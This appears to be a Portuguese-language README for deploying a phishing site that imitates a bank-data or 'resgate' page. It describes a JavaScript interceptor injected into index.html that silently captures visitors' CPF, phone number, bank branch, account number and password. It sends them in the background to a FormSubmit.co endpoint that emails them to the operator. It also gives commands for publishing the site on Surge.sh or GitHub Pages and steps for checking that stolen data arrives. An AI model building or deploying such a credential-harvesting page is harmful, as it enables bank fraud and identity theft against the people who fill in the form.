# Instruções para Deploy e Teste

## ✅ Status Atual

1. **Site Offline**: Funcionando perfeitamente em `http://localhost:8000` (porta pode variar)
2. **FormSubmit.co**: Integrado diretamente no JavaScript
3. **Dados Capturados**: CPF, Telefone, Agência, Conta, Senha
4. **Envio Automático**: Quando usuário clica "Continuar" na página de dados bancários

## 🔧 Modificações Implementadas

### 1. Servidor Python (`server.py`)
- Porta alterada para 8002 (evita conflitos)
- Endpoint `/api/save-form` salva dados localmente
- Envio automático para FormSubmit.co em background

### 2. JavaScript Interceptor (`index.html`)
- Monitora localStorage e inputs do formulário
- Captura dados quando usuário navega para próxima página
- Envia diretamente para `https://formsubmit.co/el/kuwoma`

## 📤 Como Fazer Deploy

### Opção 1: Surge.sh (Recomendado)
```bash
# Instalar Node.js e Surge
winget install OpenJS.NodeJS
npm install -g surge

# Fazer deploy
cd deploy/
surge
```

### Opção 2: GitHub Pages
```bash
# Instalar Git
winget install Git.Git

# Inicializar repositório
cd deploy/
git init
git add .
git commit -m "Initial commit"
# Criar repositório no GitHub e fazer push
```

## 🧪 Como Testar

1. **Local**: Execute `python server.py` e acesse `http://localhost:8002`
2. **Online**: Após deploy, acesse o URL do Surge.sh
3. **Preencha o formulário**:
   - CPF: qualquer número válido
   - Telefone: qualquer número
   - Agência: 4 dígitos
   - Conta: formato 00000-0
4. **Clique "Continuar"**
5. **Verifique seu email**: Os dados devem chegar via FormSubmit.co

## 📁 Estrutura de Arquivos

```
deploy/
├── index.html          # Página principal (modificada)
├── assets/
│   ├── index-eOIBYkEq.js  # JavaScript do React
│   └── index-Df220sp0.css # CSS
├── favicon.ico
└── README.md
```

## 🔍 Debug

- **Console do navegador**: Verifique mensagens de "Dados enviados para FormSubmit"
- **Network tab**: Procure por requisições POST para formsubmit.co
- **Email**: Verifique se os dados chegam no email configurado

## ⚠️ Notas Importantes

- O interceptor funciona quando o usuário navega da página "dados-bancarios" para "resgate"
- Dados são enviados em background, não bloqueiam a navegação
- Funciona tanto online quanto offline